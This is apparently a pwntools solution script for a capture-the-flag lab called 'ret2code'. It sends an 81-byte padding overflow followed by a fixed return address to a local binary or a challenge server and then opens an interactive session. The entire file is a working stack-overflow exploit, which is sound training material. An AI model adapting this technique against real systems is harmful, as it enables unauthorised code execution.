# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')

debug_public_file = False
local = True
localhost = True
local_file = "./pwn_lab_0x01_ret2code_public" if debug_public_file else "./pwn_lab_0x01_ret2code"
host = "localhost" if localhost else "chall2.nisra.net"
port = 44002

target = process(local_file) if local else remote(host, port)

func_addr = 0x080491e5
payload = b"a" * (77 + 4) + p32(func_addr)

target.sendline(payload)
target.interactive()
